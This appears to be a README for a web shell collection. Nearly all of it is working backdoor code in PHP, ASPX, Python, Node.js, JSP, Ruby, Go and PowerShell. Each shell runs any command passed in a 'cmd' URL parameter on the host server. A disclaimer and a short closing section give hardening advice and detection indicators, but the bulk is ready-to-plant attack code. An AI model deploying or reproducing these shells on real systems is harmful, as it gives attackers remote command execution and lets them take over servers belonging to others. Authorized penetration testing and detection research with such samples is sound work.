# Web Shells Research Collection .. (updated, but absolutely still terrible) 

A curated collection of web shell examples across multiple languages and platforms for security research and authorized penetration testing.

> ⚠️ **DISCLAIMER**: These examples are provided for educational and authorized security testing purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## Table of Contents

- [PHP Web Shells](#php-web-shells)
- [ASP.NET/ASPX](#aspnetaspx)
- [Python (WSGI/Flask)](#python-wsgif lask)
- [Node.js](#nodejs)
- [Java/JSP](#javajsp)
- [Ruby (Rack)](#ruby-rack)
- [Go](#go)
- [PowerShell/ASP.NET](#powershellaspnet)
- [Security Notes](#security-notes)

## PHP Web Shells

### Basic Command Execution
```php
<?php system($_GET['cmd']); ?>
```

### Alternative Execution Methods
```php
// Using passthru
<?php passthru($_GET['cmd']); ?>

// Using shell_exec
<?php echo shell_exec($_GET['cmd']); ?>

// Using exec() with array output
<?php exec($_GET['cmd'], $output); print_r($output); ?>

// Using backticks
<?php echo `{$_GET['cmd']}`; ?>
```

### Legacy Eval-based (PHP < 7.0)
```php
// Note: preg_replace /e modifier removed in PHP 7.0+
<?php preg_replace('/.*/e', 'system($_GET["cmd"]);', ''); ?>
```

## ASP.NET/ASPX

### Basic Windows Command Shell
```aspx
<%@ Page Language="C#" %>
<%
    string cmd = Request.QueryString["cmd"];
    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;
    var process = System.Diagnostics.Process.Start(psi);
    Response.Write("<pre>" + process.StandardOutput.ReadToEnd() + "</pre>");
%>
```

### VBScript Version
```aspx
<%
    Set sh = CreateObject("WScript.Shell")
    Set ex = sh.Exec("cmd /c " & Request.QueryString("cmd"))
    Response.Write("<pre>" & ex.StdOut.ReadAll() & "</pre>")
%>
```

## Python (WSGI/Flask)

### Minimal WSGI Application
```python
# wsgi_shell.py
import subprocess
from urllib.parse import parse_qs

def application(environ, start_response):
    query = environ.get('QUERY_STRING', '')
    params = parse_qs(query)
    cmd = params.get('cmd', [''])[0]
    
    try:
        output = subprocess.check_output(cmd, shell=True, text=True)
    except Exception as e:
        output = str(e)
    
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return [output.encode()]
```

### Flask Implementation
```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', '')
    try:
        return subprocess.getoutput(cmd)
    except Exception as e:
        return f"Error: {e}"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

## Node.js

### Express Server
```javascript
const express = require('express');
const { execSync } = require('child_process');

const app = express();

app.get('/shell', (req, res) => {
    try {
        const output = execSync(req.query.cmd, { encoding: 'utf8' });
        res.type('text/plain').send(output);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

### Standalone HTTP Server
```javascript
const http = require('http');
const { exec } = require('child_process');
const { URL } = require('url');

http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const cmd = url.searchParams.get('cmd');
    
    exec(cmd, (error, stdout, stderr) => {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end(stdout || stderr || error?.message);
    });
}).listen(8080);
```

## Java/JSP

### JSP Command Execution
```jsp
<%@ page import="java.io.*,java.util.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line + "<br>");
            }
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>
```

### Expression Language Injection (when enabled)
```jsp
${pageContext.request.getParameter("cmd")}
<!-- Note: EL injection requires specific server configurations -->
```

## Ruby (Rack)

### Rack Application
```ruby
# config.ru
require 'rack'

app = lambda do |env|
  request = Rack::Request.new(env)
  cmd = request.params['cmd']
  
  begin
    output = `#{cmd} 2>&1`
    [200, {'Content-Type' => 'text/plain'}, [output]]
  rescue => e
    [500, {'Content-Type' => 'text/plain'}, [e.message]]
  end
end

run app
```

## Go

### HTTP Server with Command Execution
```go
package main

import (
    "net/http"
    "os/exec"
    "log"
)

func shellHandler(w http.ResponseWriter, r *http.Request) {
    cmd := r.URL.Query().Get("cmd")
    if cmd == "" {
        http.Error(w, "No command provided", 400)
        return
    }
    
    output, err := exec.Command("sh", "-c", cmd).Output()
    if err != nil {
        http.Error(w, err.Error(), 500)
        return
    }
    
    w.Header().Set("Content-Type", "text/plain")
    w.Write(output)
}

func main() {
    http.HandleFunc("/shell", shellHandler)
    log.Println("Server starting on :8080")
    log.Fatal(http.ListenAndServe(":8080", nil))
}
```

## PowerShell/ASP.NET

### PowerShell Command Execution
```aspx
<%@ Page Language="C#" %>
<%
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", "-Command " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        
        var process = System.Diagnostics.Process.Start(psi);
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        
        Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
    }
%>
```

## Security Notes

### For Researchers
- **Always obtain proper authorization** before testing web shells
- Use these examples in isolated, controlled environments
- Document findings responsibly
- Follow coordinated disclosure practices

### For Developers
- **Input Validation**: Never trust user input - validate and sanitize all parameters
- **Least Privilege**: Run web applications under restricted accounts
- **Disable Dangerous Functions**: Remove or disable `system()`, `exec()`, `shell_exec()`, etc. in production
- **Web Application Firewalls**: Implement WAF rules to detect command injection attempts
- **Code Review**: Regularly audit code for command injection vulnerabilities
- **Content Security Policy**: Implement strict CSP headers to limit execution contexts

### Detection Indicators
- URL parameters like `cmd`, `command`, `exec`
- HTTP requests with shell metacharacters (`|`, `&`, `;`, etc.)
- Unusual process spawning from web server processes
- Network connections from web server to unexpected destinations

---

**Repository maintained for educational and authorized security testing purposes only, lol**

